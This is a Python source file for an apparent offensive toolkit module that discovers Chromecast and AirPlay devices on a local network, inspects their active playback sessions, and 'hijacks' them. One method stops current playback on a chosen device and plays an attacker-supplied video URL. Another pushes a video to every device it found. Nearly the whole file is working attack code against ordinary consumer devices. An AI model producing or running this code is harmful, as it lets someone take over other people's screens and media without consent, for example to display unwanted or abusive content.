import socket
import json
import time
import requests
from typing import List, Dict, Any, Optional
from zeroconf import Zeroconf, ServiceBrowser, ServiceListener
import pychromecast
from pychromecast.controllers.media import MediaController
from pychromecast.error import ChromecastConnectionError
import pyatv
import asyncio

class CastModule:
    """
    Cast session detection and hijacking for Chromecast and AirPlay devices.
    """
    def __init__(self, timeout: int = 5, debug: bool = False):
        self.timeout = timeout
        self.debug = debug
        self.devices: List[Dict[str, Any]] = []
        self.chromecasts = []
        self.airplay_devices = []

    async def discover_devices(self) -> List[Dict[str, Any]]:
        """
        Discover Chromecast and AirPlay devices on the network.
        """
        # Discover Chromecast devices
        try:
            self.chromecasts = pychromecast.get_chromecasts(timeout=self.timeout)
            for cc in self.chromecasts:
                device = {
                    'name': cc.device.friendly_name,
                    'address': cc.host,
                    'port': cc.port,
                    'type': 'chromecast',
                    'model': cc.device.model_name,
                    'uuid': str(cc.device.uuid),
                    'cast_type': cc.device.cast_type,
                    'manufacturer': cc.device.manufacturer
                }
                self.devices.append(device)
                if self.debug:
                    print(f"[DEBUG] Found Chromecast: {device['name']} at {device['address']}")
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error discovering Chromecasts: {e}")

        # Discover AirPlay devices
        try:
            adevs = await pyatv.scan(asyncio.get_event_loop(), timeout=self.timeout)
            for dev in adevs:
                device = {
                    'name': dev.name,
                    'address': str(dev.address),
                    'type': 'airplay',
                    'model': dev.model,
                    'identifier': str(dev.identifier)
                }
                self.airplay_devices.append(dev)
                self.devices.append(device)
                if self.debug:
                    print(f"[DEBUG] Found AirPlay device: {device['name']} at {device['address']}")
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error discovering AirPlay devices: {e}")

        return self.devices

    async def detect_sessions(self) -> List[Dict[str, Any]]:
        """
        Detect active casting sessions on discovered devices.
        """
        sessions = []
        
        # Check Chromecast sessions
        for cc in self.chromecasts:
            try:
                cc.wait()
                if cc.media_controller.status:
                    session = {
                        'device_name': cc.device.friendly_name,
                        'device_type': 'chromecast',
                        'address': cc.host,
                        'status': cc.media_controller.status.player_state,
                        'app': cc.app_display_name,
                        'media_type': cc.media_controller.status.content_type if cc.media_controller.status.content_type else 'unknown',
                        'current_time': cc.media_controller.status.current_time if cc.media_controller.status.current_time else 0,
                        'duration': cc.media_controller.status.duration if cc.media_controller.status.duration else 0,
                        'volume': cc.status.volume_level
                    }
                    sessions.append(session)
                    if self.debug:
                        print(f"[DEBUG] Found active Chromecast session on {session['device_name']}")
            except Exception as e:
                if self.debug:
                    print(f"[DEBUG] Error checking Chromecast session: {e}")

        # Check AirPlay sessions
        for dev in self.airplay_devices:
            try:
                atv = await pyatv.connect(dev, asyncio.get_event_loop())
                if atv.playing:
                    session = {
                        'device_name': dev.name,
                        'device_type': 'airplay',
                        'address': str(dev.address),
                        'status': 'playing' if atv.playing.power_state == pyatv.const.PowerState.On else 'idle',
                        'app': atv.playing.app,
                        'media_type': atv.playing.media_type,
                        'current_time': atv.playing.position,
                        'duration': atv.playing.total_time,
                        'volume': atv.playing.volume
                    }
                    sessions.append(session)
                    if self.debug:
                        print(f"[DEBUG] Found active AirPlay session on {session['device_name']}")
                await atv.close()
            except Exception as e:
                if self.debug:
                    print(f"[DEBUG] Error checking AirPlay session: {e}")

        return sessions

    async def hijack_session(self, target: str, video_url: str) -> bool:
        """
        Hijack a casting session on the specified target device.
        """
        # Find target device
        target_device = None
        device_type = None
        
        for device in self.devices:
            if device['name'].lower() == target.lower() or device['address'] == target:
                target_device = device
                device_type = device['type']
                break
        
        if not target_device:
            print(f"[!] Target device '{target}' not found")
            return False

        try:
            if device_type == 'chromecast':
                # Find matching Chromecast
                cc = None
                for cast in self.chromecasts:
                    if cast.device.friendly_name == target_device['name']:
                        cc = cast
                        break
                
                if not cc:
                    print(f"[!] Could not connect to Chromecast '{target}'")
                    return False

                # Connect and hijack
                cc.wait()
                mc = cc.media_controller
                
                # Stop current playback
                mc.stop()
                time.sleep(1)  # Give it time to stop
                
                # Start new media
                mc.play_media(video_url, 'video/mp4')  # Assuming MP4, adjust content type if needed
                mc.block_until_active()
                
                print(f"[*] Successfully hijacked Chromecast session on {target}")
                return True

            elif device_type == 'airplay':
                # Find matching AirPlay device
                atv_device = None
                for dev in self.airplay_devices:
                    if dev.name == target_device['name']:
                        atv_device = dev
                        break
                
                if not atv_device:
                    print(f"[!] Could not connect to AirPlay device '{target}'")
                    return False

                # Connect and hijack
                atv = await pyatv.connect(atv_device, asyncio.get_event_loop())
                
                # Stop current playback
                await atv.remote_control.stop()
                time.sleep(1)  # Give it time to stop
                
                # Start new media
                await atv.stream.play_url(video_url)
                
                print(f"[*] Successfully hijacked AirPlay session on {target}")
                await atv.close()
                return True

        except Exception as e:
            print(f"[!] Error hijacking session: {e}")
            return False

    async def broadcast_to_all(self, video_url: str) -> List[Dict[str, Any]]:
        """
        Broadcast video to all discovered cast-capable devices.
        """
        results = []
        
        # Broadcast to Chromecasts
        for cc in self.chromecasts:
            try:
                cc.wait()
                mc = cc.media_controller
                mc.play_media(video_url, 'video/mp4')
                mc.block_until_active()
                results.append({
                    'device': cc.device.friendly_name,
                    'type': 'chromecast',
                    'status': 'success'
                })
            except Exception as e:
                results.append({
                    'device': cc.device.friendly_name,
                    'type': 'chromecast',
                    'status': 'failed',
                    'error': str(e)
                })

        # Broadcast to AirPlay devices
        for dev in self.airplay_devices:
            try:
                atv = await pyatv.connect(dev, asyncio.get_event_loop())
                await atv.stream.play_url(video_url)
                results.append({
                    'device': dev.name,
                    'type': 'airplay',
                    'status': 'success'
                })
                await atv.close()
            except Exception as e:
                results.append({
                    'device': dev.name,
                    'type': 'airplay',
                    'status': 'failed',
                    'error': str(e)
                })

        return results 